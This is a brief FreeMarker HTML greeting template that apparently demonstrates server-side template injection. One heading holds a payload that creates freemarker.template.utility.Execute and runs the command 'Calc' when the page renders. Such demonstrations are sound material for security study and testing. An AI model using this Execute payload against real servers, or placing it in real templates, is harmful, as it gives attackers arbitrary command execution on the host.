<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello ${name}!</title>
    <link href="/css/main.css" rel="stylesheet">
</head>
<body>
    <h2 class="hello-title">Hello ${name}!</h2>
    <h3><#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}</h3>
    <script src="/js/main.js"></script>
</body>
</html>